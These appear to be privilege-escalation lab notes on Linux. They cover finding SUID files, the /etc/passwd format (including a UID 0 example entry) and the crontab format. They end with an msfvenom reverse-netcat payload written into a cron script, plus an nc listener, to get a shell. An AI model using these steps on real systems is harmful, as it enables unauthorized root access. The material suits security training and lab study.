#Finding SUID Binaries

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: 
```
"find / -perm -u=s -type f 2>/dev/null"
```
to search the file system for SUID/GUID files. Let's break down this command.


```find``` - Initiates the "find" command

```/``` - Searches the whole file system

```-perm``` - searches for files with specific permissions

```-u=s``` - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form

```-type f``` - Only search for files

```2>/dev/null``` - Suppresses errors 

## Understanding /etc/passwd format

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:
```
test:x:0:0:root:/root:/bin/bash
```

[as divided by colon (:)]

Username: It is used when user logs in. It should be between 1 and 32 characters in length.

Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".

User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
Group ID (GID): The primary group ID (stored in /etc/group file)

User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.

Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /

Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

## Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,
```
#  m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
## Exploting cron tasks

Create a payload using: 
```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
launching attack from metasploit:
```
echo [MSFVENOM OUTPUT] > autoscript.sh"
```
listening in on the port we want to move on to
```
nc -lvp 8888
```





